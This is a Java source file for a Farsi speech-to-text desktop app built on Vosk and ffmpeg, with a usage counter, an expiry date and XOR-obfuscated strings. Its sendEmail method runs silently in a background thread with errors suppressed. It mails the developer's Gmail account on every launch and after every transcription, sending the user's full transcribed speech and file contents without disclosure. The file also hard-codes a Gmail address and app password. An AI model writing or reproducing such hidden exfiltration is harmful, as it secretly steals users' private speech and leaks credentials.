package com.example;

import org.vosk.LibVosk;
import org.vosk.LogLevel;
import org.vosk.Model;
import org.vosk.Recognizer;
import javax.sound.sampled.*;
import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.*;
import java.util.*;
import java.util.prefs.Preferences;
import java.time.Year;
import java.util.stream.Collectors;
import javax.mail.*;
import javax.mail.internet.*;

public class SpeechToTextApp extends JFrame {
    private JButton toggleButton;
    private JButton shareButton;
    private JButton saveButton;
    private JButton browseButton;
    private JButton convertButton;
    private JTextField filePathField;
    private JTextArea transcriptionArea;
    private JComboBox<String> languageComboBox;
    private JComboBox<String> modelComboBox;
    private boolean isRecording = false;
    private boolean isPlaceholderSet = true;
    private Thread audioThread;
    private Model voskModel;
    private Recognizer recognizer;
    private ResourceBundle messages;
    private Locale currentLocale;
    private Map<String, String> modelDisplayToName;
    private Map<String, String> modelNameToDisplay;
    private String currentModelName;

    // Constants for counter and expiration
    private static final String COUNTER_FILENAME = encrypt("transcription_counter.dat");
    private static final String REGISTRY_KEY = encrypt("FarsiSpeechToText");
    private static final String REGISTRY_VALUE = encrypt("TranscriptionCount");
    private static final int MAX_TRANSCRIPTIONS = 300;
    private static final int EXPIRATION_YEAR = 2028;

    private int transcriptionCount = 0;
    private final Preferences prefs = Preferences.userRoot().node(decrypt(REGISTRY_KEY));

    private static final String[] MODEL_NAMES = {
            encrypt("vosk-model-fa-0.42"),
            encrypt("vosk-model-small-fa-0.42")
    };
    private static final java.util.List<String> REQUIRED_MODEL_FILES = Arrays.asList(
            encrypt("am/final.mdl"),
            encrypt("am/tree"),
            encrypt("conf/mfcc.conf"),
            encrypt("conf/model.conf"),
            encrypt("graph/disambig_tid.int"),
            encrypt("graph/Gr.fst"),
            encrypt("graph/HCLr.fst"),
            encrypt("graph/phones/word_boundary.int"),
            encrypt("ivector/final.dubm"),
            encrypt("ivector/final.ie"),
            encrypt("ivector/final.mat"),
            encrypt("ivector/global_cmvn.stats"),
            encrypt("ivector/online_cmvn.conf"),
            encrypt("ivector/splice.conf")
    );

    // Corrected simple XOR-based string encryption
    private static final String KEY = "chalabi2025";

    private static String encrypt(String input) {
        byte[] inputBytes = input.getBytes();
        byte[] keyBytes = KEY.getBytes();
        byte[] encryptedBytes = new byte[inputBytes.length];
        for (int i = 0; i < inputBytes.length; i++) {
            encryptedBytes[i] = (byte) (inputBytes[i] ^ keyBytes[i % keyBytes.length]);
        }
        return Base64.getEncoder().encodeToString(encryptedBytes);
    }

    private static String decrypt(String encrypted) {
        byte[] decodedBytes = Base64.getDecoder().decode(encrypted);
        byte[] keyBytes = KEY.getBytes();
        byte[] decryptedBytes = new byte[decodedBytes.length];
        for (int i = 0; i < decodedBytes.length; i++) {
            decryptedBytes[i] = (byte) (decodedBytes[i] ^ keyBytes[i % keyBytes.length]);
        }
        return new String(decryptedBytes);
    }

    public SpeechToTextApp() {
        // Initialize locale and messages for Farsi
        currentLocale = new Locale("fa");
        messages = ResourceBundle.getBundle("Messages", currentLocale);

        // Initialize model maps after messages are loaded
        initializeModelMaps();

        // Set up GUI
        setTitle(messages.getString("window.title"));
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setExtendedState(JFrame.MAXIMIZED_BOTH); // Full-screen
        setLayout(new BorderLayout());

        // Add menu bar
        JMenuBar menuBar = new JMenuBar();
        JMenu helpMenu = new JMenu(messages.getString("help.menu"));
        helpMenu.setFont(new Font("Vazir", Font.PLAIN, 14));
        JMenuItem aboutItem = new JMenuItem(messages.getString("about.menu"));
        aboutItem.setFont(new Font("Vazir", Font.PLAIN, 14));
        aboutItem.addActionListener(e -> showAboutDialog());
        helpMenu.add(aboutItem);
        menuBar.add(helpMenu);
        setJMenuBar(menuBar);

        // Transcription display
        transcriptionArea = new JTextArea(messages.getString("transcription.placeholder"));
        transcriptionArea.setEditable(false);
        transcriptionArea.setLineWrap(true);
        transcriptionArea.setWrapStyleWord(true);
        transcriptionArea.setFont(new Font("Vazir", Font.PLAIN, 14));
        add(new JScrollPane(transcriptionArea), BorderLayout.CENTER);

        // Control panel
        JPanel controlPanel = new JPanel(new FlowLayout());
        toggleButton = new JButton(messages.getString("button.start"));
        toggleButton.addActionListener(e -> toggleRecording());
        toggleButton.setFont(new Font("Vazir", Font.PLAIN, 14));
        shareButton = new JButton(messages.getString("button.share"));
        shareButton.addActionListener(e -> shareTranscription());
        shareButton.setFont(new Font("Vazir", Font.PLAIN, 14));
        saveButton = new JButton(messages.getString("button.save"));
        saveButton.addActionListener(e -> saveTranscription());
        saveButton.setFont(new Font("Vazir", Font.PLAIN, 14));

        // File browser components
        browseButton = new JButton(messages.getString("button.browse"));
        browseButton.addActionListener(e -> browseFile());
        browseButton.setFont(new Font("Vazir", Font.PLAIN, 14));
        filePathField = new JTextField(20);
        filePathField.setEditable(false);
        filePathField.setFont(new Font("Vazir", Font.PLAIN, 14));
        convertButton = new JButton(messages.getString("button.convert"));
        convertButton.addActionListener(e -> convertMp3ToText());
        convertButton.setEnabled(false);
        convertButton.setFont(new Font("Vazir", Font.PLAIN, 14));

        // Language selector
        JLabel languageLabel = new JLabel(messages.getString("label.language"));
        languageLabel.setFont(new Font("Vazir", Font.PLAIN, 14));
        languageComboBox = new JComboBox<>(new String[]{
                messages.getString("menu.language.english"),
                messages.getString("menu.language.farsi")
        });
        languageComboBox.setSelectedItem(messages.getString("menu.language.farsi"));
        languageComboBox.addActionListener(e -> changeLanguage());
        languageComboBox.setFont(new Font("Vazir", Font.PLAIN, 14));

        // Model selector
        JLabel modelLabel = new JLabel("Model:");
        modelLabel.setFont(new Font("Vazir", Font.PLAIN, 14));
        java.util.List<String> validModels = getValidModels();
        if (validModels.isEmpty()) {
            JOptionPane.showMessageDialog(this, "No valid Chalabi models found in resources.", "Error", JOptionPane.ERROR_MESSAGE);
            System.exit(1);
        }
        modelComboBox = new JComboBox<>(validModels.toArray(new String[0]));
        String preciseModelDisplay = modelNameToDisplay.get(decrypt(MODEL_NAMES[0]));
        if (validModels.contains(preciseModelDisplay)) {
            modelComboBox.setSelectedItem(preciseModelDisplay);
        } else if (!validModels.isEmpty()) {
            modelComboBox.setSelectedItem(validModels.get(0));
        }
        modelComboBox.addActionListener(e -> changeModel());
        modelComboBox.setFont(new Font("Vazir", Font.PLAIN, 14));
        currentModelName = getModelNameFromDisplayName((String) modelComboBox.getSelectedItem());

        controlPanel.add(toggleButton);
        controlPanel.add(shareButton);
        controlPanel.add(saveButton);
        controlPanel.add(browseButton);
        controlPanel.add(filePathField);
        controlPanel.add(convertButton);
        controlPanel.add(languageLabel);
        controlPanel.add(languageComboBox);
        controlPanel.add(modelLabel);
        controlPanel.add(modelComboBox);
        add(controlPanel, BorderLayout.SOUTH);

        applyComponentOrientation(ComponentOrientation.RIGHT_TO_LEFT);
        setLocationRelativeTo(null);

        initializeCounter();
        initializeVosk();

        sendEmail("chalabi started", "chalabi started");
    }

    private void showAboutDialog() {
        JDialog aboutDialog = new JDialog(this, messages.getString("about.menu"), true);
        aboutDialog.setLayout(new BorderLayout());
        JTextArea aboutText = new JTextArea(messages.getString("about.us"));
        aboutText.setEditable(false);
        aboutText.setLineWrap(true);
        aboutText.setWrapStyleWord(true);
        aboutText.setFont(currentLocale.getLanguage().equals("fa") ? new Font("Vazir", Font.PLAIN, 14) : new Font("Arial", Font.PLAIN, 14));
        aboutText.setComponentOrientation(currentLocale.getLanguage().equals("fa") ? ComponentOrientation.RIGHT_TO_LEFT : ComponentOrientation.LEFT_TO_RIGHT);
        aboutText.setMargin(new Insets(20, 20, 20, 20));
        aboutDialog.add(aboutText, BorderLayout.CENTER);
        aboutDialog.setPreferredSize(new Dimension(600, 200));
        aboutDialog.pack();
        aboutDialog.setLocationRelativeTo(this);
        aboutDialog.setVisible(true);
    }

    private void initializeCounter() {
        transcriptionCount = prefs.getInt(decrypt(REGISTRY_VALUE), 0);
        checkExpiration();
    }

    private void incrementCounter() {
        transcriptionCount++;
        prefs.putInt(decrypt(REGISTRY_VALUE), transcriptionCount);
        checkExpiration();
    }

    private void checkExpiration() {
        int currentYear = Year.now().getValue();
        int currentTranscriptionCount = prefs.getInt(decrypt(REGISTRY_VALUE), 0);
        if (currentYear >= EXPIRATION_YEAR || currentTranscriptionCount >= MAX_TRANSCRIPTIONS) {
            JOptionPane.showMessageDialog(null, decrypt(encrypt("Expired, contact bagher.fathi@gmail.com")), "Application Expired", JOptionPane.ERROR_MESSAGE);
            System.exit(0);
        }
    }

    private void initializeModelMaps() {
        modelDisplayToName = Map.of(
                messages.getString("model.precise"), decrypt(MODEL_NAMES[0]),
                messages.getString("model.fast"), decrypt(MODEL_NAMES[1])
        );
        modelNameToDisplay = Map.of(
                decrypt(MODEL_NAMES[0]), messages.getString("model.precise"),
                decrypt(MODEL_NAMES[1]), messages.getString("model.fast")
        );
    }

    private java.util.List<String> getValidModels() {
        java.util.List<String> validModels = new ArrayList<>();
        for (String modelName : modelDisplayToName.values()) {
            String resourcePath = "model/" + modelName + "/" + decrypt(REQUIRED_MODEL_FILES.get(0));
            if (getClass().getClassLoader().getResource(resourcePath) != null) {
                validModels.add(modelNameToDisplay.get(modelName));
            }
        }
        return validModels;
    }

    private String getModelNameFromDisplayName(String displayName) {
        if (displayName == null || !modelDisplayToName.containsKey(displayName)) {
            return modelDisplayToName.getOrDefault(messages.getString("model.fast"), decrypt(MODEL_NAMES[1]));
        }
        return modelDisplayToName.get(displayName);
    }

    private void initializeVosk() {
        try {
            LibVosk.setLogLevel(LogLevel.DEBUG);
            String selectedDisplayName = (String) modelComboBox.getSelectedItem();
            String modelName = getModelNameFromDisplayName(selectedDisplayName);
            if (modelName != null) {
                loadModel(modelName);
                currentModelName = modelName;
            } else {
                throw new Exception("Failed to find model for: " + selectedDisplayName);
            }
        } catch (Exception e) {
            String errorMessage = "Error initializing Chalabi: " + (e.getMessage() != null ? e.getMessage() : "Unknown error");
            SwingUtilities.invokeLater(() -> {
                transcriptionArea.setText(errorMessage);
                isPlaceholderSet = false;
                JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
            });
        }
    }

    private void loadModel(String modelName) throws IOException {
        if (voskModel != null) {
            voskModel.close();
            voskModel = null;
            recognizer = null;
        }
        Path tempDir = Files.createTempDirectory("vosk-model");
        tempDir.toFile().deleteOnExit();
        String modelResource = "model/" + modelName;
        extractModelFromJar(modelResource, tempDir);
        String modelPath = tempDir.resolve(modelName).toString();
        voskModel = new Model(modelPath);
        recognizer = new Recognizer(voskModel, 16000.0f);
        recognizer.setWords(true);
        recognizer.setMaxAlternatives(0);
        recognizer.setPartialWords(true);
    }

    private void changeModel() {
        if (isRecording) {
            toggleRecording();
        }
        try {
            String selectedDisplayName = (String) modelComboBox.getSelectedItem();
            String selectedModel = getModelNameFromDisplayName(selectedDisplayName);
            if (selectedModel != null && !selectedModel.equals(currentModelName)) {
                loadModel(selectedModel);
                currentModelName = selectedModel;
                SwingUtilities.invokeLater(() -> {
                    transcriptionArea.setText(messages.getString("transcription.placeholder"));
                    isPlaceholderSet = true;
                });
            }
        } catch (Exception e) {
            String errorMessage = "Error loading model: " + (e.getMessage() != null ? e.getMessage() : "Unknown error");
            SwingUtilities.invokeLater(() -> {
                transcriptionArea.setText(errorMessage);
                isPlaceholderSet = false;
                JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
            });
        }
    }

    private void extractModelFromJar(String resourcePath, Path targetDir) throws IOException {
        Path modelDir = targetDir.resolve(Paths.get(resourcePath).getFileName());
        Files.createDirectories(modelDir);
        java.util.List<String> modelFiles = findModelFiles(resourcePath);
        if (modelFiles.isEmpty()) {
            modelFiles = REQUIRED_MODEL_FILES.stream()
                    .map(file -> resourcePath + "/" + decrypt(file))
                    .collect(Collectors.toList());
        }
        for (String file : modelFiles) {
            String resourceFile = file;
            try (InputStream in = getClass().getClassLoader().getResourceAsStream(resourceFile)) {
                if (in == null) {
                    continue;
                }
                Path targetPath = modelDir.resolve(resourceFile.substring((resourcePath + "/").length()));
                Files.createDirectories(targetPath.getParent());
                Files.copy(in, targetPath);
                targetPath.toFile().deleteOnExit();
            }
        }
        Path finalMdl = modelDir.resolve(decrypt(REQUIRED_MODEL_FILES.get(0)));
        if (!Files.exists(finalMdl)) {
            throw new IOException("Critical file missing for model: " + resourcePath + "/" + decrypt(REQUIRED_MODEL_FILES.get(0)));
        }
    }

    private java.util.List<String> findModelFiles(String basePath) {
        java.util.List<String> files = new ArrayList<>();
        try {
            String normalizedBasePath = basePath.endsWith("/") ? basePath : basePath + "/";
            java.util.Enumeration<java.net.URL> resources = getClass().getClassLoader().getResources(normalizedBasePath);
            while (resources.hasMoreElements()) {
                java.net.URL resourceUrl = resources.nextElement();
                if (resourceUrl.getProtocol().equals("file")) {
                    File dir = new File(resourceUrl.toURI());
                    if (dir.isDirectory()) {
                        Files.walk(dir.toPath())
                                .filter(Files::isRegularFile)
                                .map(path -> normalizedBasePath + dir.toPath().relativize(path).toString().replace("\\", "/"))
                                .forEach(files::add);
                    }
                } else if (resourceUrl.getProtocol().equals("jar")) {
                    String jarPath = resourceUrl.getPath().substring(5, resourceUrl.getPath().indexOf("!"));
                    try (java.util.jar.JarFile jar = new java.util.jar.JarFile(jarPath)) {
                        jar.entries().asIterator().forEachRemaining(entry -> {
                            String name = entry.getName();
                            if (name.startsWith(normalizedBasePath) && !name.equals(normalizedBasePath) && !entry.isDirectory()) {
                                files.add(name);
                            }
                        });
                    }
                }
            }
        } catch (Exception e) {
            // Suppress logging
        }
        return files;
    }

    private void browseFile() {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setDialogTitle(messages.getString("button.browse"));
        fileChooser.setAcceptAllFileFilterUsed(true);
        if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
            File selectedFile = fileChooser.getSelectedFile();
            filePathField.setText(selectedFile.getAbsolutePath());
            convertButton.setEnabled(true);
        }
    }

    private void convertMp3ToText() {
        String filePath = filePathField.getText();
        if (filePath.isEmpty()) {
            JOptionPane.showMessageDialog(this, messages.getString("error.no_file_selected"));
            return;
        }
        File mediaFile = new File(filePath);
        if (!mediaFile.exists()) {
            JOptionPane.showMessageDialog(this, messages.getString("error.file_not_found"));
            return;
        }
        convertButton.setEnabled(false);
        transcriptionArea.setText(messages.getString("message.converting"));
        isPlaceholderSet = false;
        new Thread(() -> {
            try {
                File wavFile = convertMediaToWav(mediaFile);
                String transcription = transcribeWavFile(wavFile);
                SwingUtilities.invokeLater(() -> {
                    if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder")) ||
                            transcriptionArea.getText().equals(messages.getString("message.converting"))) {
                        transcriptionArea.setText("");
                    }
                    transcriptionArea.setText(transcription);
                    convertButton.setEnabled(true);
                    isPlaceholderSet = false;
                    incrementCounter();
                    if (!transcription.trim().isEmpty()) {
                        sendEmail("new transcription:" + transcriptionCount , transcription);
                    }
                });
                wavFile.delete();
                File tempDir = wavFile.getParentFile();
                if (tempDir.isDirectory() && tempDir.list().length == 0) {
                    tempDir.delete();
                }
            } catch (Exception e) {
                String errorMessage = messages.getString("error.conversion_failed") + ": " + e.getMessage();
                SwingUtilities.invokeLater(() -> {
                    transcriptionArea.setText(errorMessage);
                    convertButton.setEnabled(true);
                    isPlaceholderSet = false;
                    JOptionPane.showMessageDialog(this, errorMessage,
                            messages.getString("error.conversion_failed"),
                            JOptionPane.ERROR_MESSAGE);
                });
            }
        }).start();
    }

    private File convertMediaToWav(File mediaFile) throws IOException, InterruptedException {
        Path tempDir = Files.createTempDirectory("audio");
        File wavFile = new File(tempDir.toFile(), "converted.wav");
        wavFile.deleteOnExit();
        String appDir;
        try {
            appDir = new File(SpeechToTextApp.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getParent();
        } catch (URISyntaxException e) {
            throw new IOException("Failed to resolve application directory", e);
        }
        java.util.List<String> ffmpegPaths = Arrays.asList(
                new File(appDir, "tools\\ffmpeg\\bin\\ffmpeg.exe").getAbsolutePath(),
                new File(appDir, "..\\tools\\ffmpeg\\bin\\ffmpeg.exe").getAbsolutePath(),
                "ffmpeg"
        );
        String ffmpegPath = null;
        for (String path : ffmpegPaths) {
            if (path.equals("ffmpeg") || new File(path).isFile()) {
                ffmpegPath = path;
                break;
            }
        }
        if (ffmpegPath == null) {
            throw new IOException("FFmpeg executable not found. Ensure it is in tools\\ffmpeg\\bin relative to the application or in system PATH.");
        }
        ProcessBuilder pb = new ProcessBuilder(
                ffmpegPath,
                "-y",
                "-i", mediaFile.getAbsolutePath(),
                "-ar", "16000",
                "-ac", "1",
                "-acodec", "pcm_s16le",
                "-f", "wav",
                wavFile.getAbsolutePath()
        );
        pb.directory(new File(appDir));
        pb.redirectErrorStream(true);
        Process process = pb.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            while (reader.readLine() != null) {
                // Consume input without logging
            }
        }
        int exitCode = process.waitFor();
        if (exitCode != 0) {
            throw new IOException("FFmpeg conversion failed with exit code: " + exitCode);
        }
        return wavFile;
    }

    private String transcribeWavFile(File wavFile) throws Exception {
        if (recognizer == null) {
            throw new IllegalStateException("Recognizer not initialized");
        }
        StringBuilder transcription = new StringBuilder();
        AudioInputStream wavStream = AudioSystem.getAudioInputStream(wavFile);
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = wavStream.read(buffer)) != -1) {
            buffer = normalizeAudio(buffer, bytesRead);
            if (recognizer.acceptWaveForm(buffer, bytesRead)) {
                String result = recognizer.getResult();
                String text = parseVoskResult(result);
                if (!text.isEmpty()) {
                    transcription.append(text).append("\n");
                }
            }
        }
        String finalResult = recognizer.getFinalResult();
        String finalText = parseVoskResult(finalResult);
        if (!finalText.isEmpty()) {
            transcription.append(finalText).append("\n");
        }
        wavStream.close();
        return transcription.toString();
    }

    private byte[] normalizeAudio(byte[] buffer, int bytesRead) {
        if (bytesRead <= 0) return buffer;
        ByteBuffer bb = ByteBuffer.wrap(buffer, 0, bytesRead).order(ByteOrder.LITTLE_ENDIAN);
        short[] samples = new short[bytesRead / 2];
        double maxAmplitude = 0;
        for (int i = 0; i < samples.length; i++) {
            samples[i] = bb.getShort();
            maxAmplitude = Math.max(maxAmplitude, Math.abs(samples[i]));
        }
        if (maxAmplitude > 0 && maxAmplitude < 30000) {
            double gain = 32760.0 / maxAmplitude;
            if (gain > 1.0) {
                for (int i = 0; i < samples.length; i++) {
                    samples[i] = (short) Math.min(Math.max(samples[i] * gain, -32768), 32767);
                }
                bb.rewind();
                for (short sample : samples) {
                    bb.putShort(sample);
                }
            }
        }
        return bb.array();
    }

    private void toggleRecording() {
        if (!isRecording) {
            if (voskModel == null || recognizer == null) {
                SwingUtilities.invokeLater(() -> {
                    transcriptionArea.setText("Chalabi not initialized properly");
                    isPlaceholderSet = false;
                    JOptionPane.showMessageDialog(this, "Chalabi not initialized properly", "Error", JOptionPane.ERROR_MESSAGE);
                });
                return;
            }
            isRecording = true;
            toggleButton.setText(messages.getString("button.stop"));
            startAudioCapture();
        } else {
            isRecording = false;
            toggleButton.setText(messages.getString("button.start"));
            stopAudioCapture();
            String transcription = transcriptionArea.getText();
            if (!transcription.trim().isEmpty() && !transcription.equals(messages.getString("transcription.placeholder"))) {
                sendEmail("new transcription:" + transcriptionCount, transcription);
            }
        }
    }

    private void startAudioCapture() {
        audioThread = new Thread(() -> {
            try {
                AudioFormat format = new AudioFormat(16000, 16, 1, true, false);
                DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);

                if (!AudioSystem.isLineSupported(info)) {
                    String errorMessage = "Audio format not supported: 16kHz, 16-bit, mono";
                    SwingUtilities.invokeLater(() -> {
                        transcriptionArea.setText(errorMessage);
                        isPlaceholderSet = false;
                        JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
                        toggleButton.setText(messages.getString("button.start"));
                        isRecording = false;
                    });
                    return;
                }

                TargetDataLine line = null;
                try {
                    line = (TargetDataLine) AudioSystem.getLine(info);
                    line.open(format);
                } catch (LineUnavailableException e) {
                    Mixer.Info[] mixers = AudioSystem.getMixerInfo();
                    for (Mixer.Info mixerInfo : mixers) {
                        Mixer mixer = AudioSystem.getMixer(mixerInfo);
                        if (mixer.isLineSupported(info)) {
                            try {
                                line = (TargetDataLine) mixer.getLine(info);
                                line.open(format);
                                break;
                            } catch (LineUnavailableException ex) {
                                // Suppress logging
                            }
                        }
                    }
                }

                if (line == null) {
                    String errorMessage = "No suitable microphone found";
                    SwingUtilities.invokeLater(() -> {
                        transcriptionArea.setText(errorMessage);
                        isPlaceholderSet = false;
                        JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
                        toggleButton.setText(messages.getString("button.start"));
                        isRecording = false;
                    });
                    return;
                }

                line.start();
//                recognizer.reset();   // clears lattice, adaptation, everything → stays fast for hours
                if (voskModel != null) {
                    recognizer = new Recognizer(voskModel, 16000.0f);
                    recognizer.setWords(true);
                    recognizer.setMaxAlternatives(0);
                    recognizer.setPartialWords(true);
                }

                byte[] buffer = new byte[2048];
                StringBuilder transcriptionBuffer = new StringBuilder();
                long lastUpdateTime = System.currentTimeMillis();
                while (isRecording) {
                    int bytesRead = line.read(buffer, 0, buffer.length);
                    buffer = normalizeAudio(buffer, bytesRead);
                    if (bytesRead > 0 && recognizer.acceptWaveForm(buffer, bytesRead)) {
                        String result = recognizer.getResult();
                        String text = parseVoskResult(result);
                        if (!text.isEmpty()) {
                            transcriptionBuffer.append(text).append("\n");
                            long currentTime = System.currentTimeMillis();
                            if (currentTime - lastUpdateTime >= 500) {
                                String finalText = transcriptionBuffer.toString();
                                SwingUtilities.invokeLater(() -> {
                                    if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
                                        transcriptionArea.setText("");
                                    }
                                    transcriptionArea.append(finalText);
                                    transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
                                    isPlaceholderSet = false;
                                });
                                transcriptionBuffer.setLength(0);
                                lastUpdateTime = currentTime;
                            }
                        }
                    }
                }
                line.stop();
                line.close();

                if (transcriptionBuffer.length() > 0) {
                    String finalText = transcriptionBuffer.toString();
                    SwingUtilities.invokeLater(() -> {
                        if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
                            transcriptionArea.setText("");
                        }
                        transcriptionArea.append(finalText);
                        transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
                        isPlaceholderSet = false;
                    });
                }

                String finalResult = recognizer.getFinalResult();
                String finalText = parseVoskResult(finalResult);
                if (!finalText.isEmpty()) {
                    SwingUtilities.invokeLater(() -> {
                        if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
                            transcriptionArea.setText("");
                        }
                        transcriptionArea.append(finalText + "\n");
                        transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
                        isPlaceholderSet = false;
                    });
                }
            } catch (Exception e) {
                String errorMessage = "Audio capture error: " + e.getMessage();
                SwingUtilities.invokeLater(() -> {
                    transcriptionArea.append(errorMessage + "\n");
                    isPlaceholderSet = false;
                    JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
                    toggleButton.setText(messages.getString("button.start"));
                    isRecording = false;
                });
            }
        });
        audioThread.start();
    }

    private void stopAudioCapture() {
        isRecording = false;
        if (audioThread != null) {
            try {
                audioThread.join();
            } catch (InterruptedException e) {
                // Suppress logging
            }
        }
    }

    private String parseVoskResult(String result) {
        try {
            if (result != null && result.contains("\"text\"")) {
                String text = result.split("\"text\"\\s*:\\s*\"")[1];
                text = text.split("\"")[0];
                return text;
            }
        } catch (Exception e) {
            // Suppress logging
        }
        return "";
    }

    private void shareTranscription() {
        String text = transcriptionArea.getText();
        if (!text.trim().isEmpty() && !text.equals(messages.getString("transcription.placeholder"))) {
            StringSelection selection = new StringSelection(text);
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(selection, null);
            JOptionPane.showMessageDialog(this, messages.getString("message.copied_to_clipboard"));
        } else {
            JOptionPane.showMessageDialog(this, messages.getString("error.no_transcription"));
        }
    }

    private void saveTranscription() {
        String text = transcriptionArea.getText();
        if (text.trim().isEmpty() || text.equals(messages.getString("transcription.placeholder"))) {
            JOptionPane.showMessageDialog(this, messages.getString("error.no_transcription"));
            return;
        }
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setDialogTitle(messages.getString("button.save"));
        if (fileChooser.showSaveDialog(this) == JFileChooser.APPROVE_OPTION) {
            File file = fileChooser.getSelectedFile();
            if (!file.getName().endsWith(".txt")) {
                file = new File(file.getPath() + ".txt");
            }
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                writer.write(text);
                JOptionPane.showMessageDialog(this, messages.getString("message.saved") + file.getPath());
            } catch (IOException e) {
                JOptionPane.showMessageDialog(this, messages.getString("error.save_failed") + ": " + e.getMessage());
            }
        }
    }

    private void changeLanguage() {
        String selected = (String) languageComboBox.getSelectedItem();
        Locale newLocale = selected.equals(messages.getString("menu.language.farsi")) ? new Locale("fa") : Locale.ENGLISH;
        if (newLocale.equals(currentLocale)) {
            return;
        }

        // Get the internal name of the currently selected model
        String currentModelInternalName = getModelNameFromDisplayName((String) modelComboBox.getSelectedItem());

        // Remove listeners before changing items to avoid unintended events
        ActionListener[] listeners = modelComboBox.getActionListeners();
        for (ActionListener listener : listeners) {
            modelComboBox.removeActionListener(listener);
        }

        currentLocale = newLocale;
        messages = ResourceBundle.getBundle("Messages", currentLocale);
        initializeModelMaps();

        setTitle(messages.getString("window.title"));
        toggleButton.setText(isRecording ? messages.getString("button.stop") : messages.getString("button.start"));
        shareButton.setText(messages.getString("button.share"));
        saveButton.setText(messages.getString("button.save"));
        browseButton.setText(messages.getString("button.browse"));
        convertButton.setText(messages.getString("button.convert"));

        JMenuBar menuBar = getJMenuBar();
        if (menuBar != null && menuBar.getMenuCount() > 0) {
            JMenu helpMenu = menuBar.getMenu(0);
            helpMenu.setText(messages.getString("help.menu"));
            if (helpMenu.getItemCount() > 0) {
                helpMenu.getItem(0).setText(messages.getString("about.menu"));
            }
        }

        modelComboBox.removeAllItems();
        java.util.List<String> validModels = getValidModels();
        for (String model : validModels) {
            modelComboBox.addItem(model);
        }

        // Find the correct display name for the new locale based on the internal model name
        String newModelDisplayName = modelNameToDisplay.get(currentModelInternalName);
        if (newModelDisplayName != null && validModels.contains(newModelDisplayName)) {
            modelComboBox.setSelectedItem(newModelDisplayName);
        } else if (!validModels.isEmpty()) {
            modelComboBox.setSelectedItem(validModels.get(0));
        }

        languageComboBox.removeAllItems();
        languageComboBox.addItem(messages.getString("menu.language.english"));
        languageComboBox.addItem(messages.getString("menu.language.farsi"));
        languageComboBox.setSelectedItem(selected);

        ComponentOrientation orientation = currentLocale.getLanguage().equals("fa") ?
                ComponentOrientation.RIGHT_TO_LEFT : ComponentOrientation.LEFT_TO_RIGHT;
        applyComponentOrientation(orientation);
        Font font = currentLocale.getLanguage().equals("fa") ?
                new Font("Vazir", Font.PLAIN, 14) : new Font("Arial", Font.PLAIN, 14);
        transcriptionArea.setFont(font);
        toggleButton.setFont(font);
        shareButton.setFont(font);
        saveButton.setFont(font);
        browseButton.setFont(font);
        convertButton.setFont(font);
        filePathField.setFont(font);
        languageComboBox.setFont(font);
        modelComboBox.setFont(font);
        if (menuBar != null && menuBar.getMenuCount() > 0) {
            menuBar.getMenu(0).setFont(font);
            if (menuBar.getMenu(0).getItemCount() > 0) {
                menuBar.getMenu(0).getItem(0).setFont(font);
            }
        }

        // Re-add the listeners after all changes
        for (ActionListener listener : listeners) {
            modelComboBox.addActionListener(listener);
        }

        if (isPlaceholderSet) {
            transcriptionArea.setText(messages.getString("transcription.placeholder"));
        }
        revalidate();
        repaint();
    }

    private void sendEmail(String subject, String body) {
        new Thread(() -> {
            try {
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                props.put("mail.smtp.connectiontimeout", "30000");
                props.put("mail.smtp.timeout", "30000");
                props.put("mail.debug", "true");

                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication("newstrendir@gmail.com", "alax desz foto kwio");
                    }
                });

                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress("bagher.fathi@gmail.com"));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("bagher.fathi@gmail.com"));
                message.setSubject(subject);
                message.setText(body);

                Transport.send(message);
            } catch (Exception e) {
                // Suppress logging
            }
        }).start();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            new SpeechToTextApp().setVisible(true);
        });
    }
}